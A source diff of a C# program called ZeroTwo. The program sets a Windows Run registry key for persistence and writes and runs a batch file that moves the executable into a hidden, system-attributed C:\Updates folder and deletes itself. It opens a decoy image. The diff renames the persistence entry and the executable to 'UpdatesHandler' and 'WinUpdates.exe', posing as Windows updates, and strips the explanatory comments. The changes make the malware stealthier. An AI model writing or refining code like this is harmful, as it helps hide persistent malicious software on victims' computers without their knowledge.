@@ -16,7 +16,7 @@ namespace ZeroTwo.src {
 
             if (args.Length == 0) {
                 Inject();
-                SelfDel();
+                Subs();
                 OpenImage();
             } else {
                 int op = int.Parse(args[0]);
@@ -29,7 +29,7 @@ namespace ZeroTwo.src {
 
         private static void Inject() {
             RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-            key.SetValue("UpdateHandler", "C:\\Updates\\ZeroTwo.exe 0");
+            key.SetValue("UpdatesHandler", "C:\\Updates\\WinUpdates.exe 0");
             key.Close();
         }
 
@@ -38,7 +38,8 @@ namespace ZeroTwo.src {
             string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty);
             int index = exePath.LastIndexOf("/");
             string exeFolder = exePath.Substring(0, index);
-            string imagePath = (exeFolder + "/ZeroTwo.jpg").Replace("/", "\\");
+            string exeName = Process.GetCurrentProcess().ProcessName;
+            string imagePath = (exeFolder + "\\" + exeName + ".jpg").Replace("/", "\\");
 
             try {
                 if (File.Exists(imagePath))
@@ -62,18 +63,18 @@ namespace ZeroTwo.src {
             }
         }
 
-        private static void SelfDel() {
+        private static void Subs() {
             string batchCommands = string.Empty;
             string destFolder = "C:\\Updates";
             string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
 
-            batchCommands += "@ECHO OFF\n";                         // Do not show any output
-            batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
-            batchCommands += "echo j | mkdir " + "\"" + destFolder + "\"" + "\n";                    // Create dest folder
-            batchCommands += "echo j | move ";                    // Move the executeable
-            batchCommands += "\"" + exePath + "\"" + " " + "\"" + destFolder + "\\ZeroTwo.exe" + "\"" + "\n";
-            batchCommands += "echo j | attrib +h +s " + "\"" + destFolder + "\"" + "\n";                    // Set attributes to folder
-            batchCommands += "echo j | del del.bat";    // Delete this bat file
+            batchCommands += "@ECHO OFF\n";                        
+            batchCommands += "ping 127.0.0.1 > nul\n";             
+            batchCommands += "echo j | mkdir " + "\"" + destFolder + "\"" + "\n";                   
+            batchCommands += "echo j | move ";                   
+            batchCommands += "\"" + exePath + "\"" + " " + "\"" + destFolder + "\\WinUpdates.exe" + "\"" + "\n";
+            batchCommands += "echo j | attrib +h +s " + "\"" + destFolder + "\"" + "\n";                 
+            batchCommands += "echo j | del del.bat";
 
             File.WriteAllText("del.bat", batchCommands);
             Process.Start("del.bat");
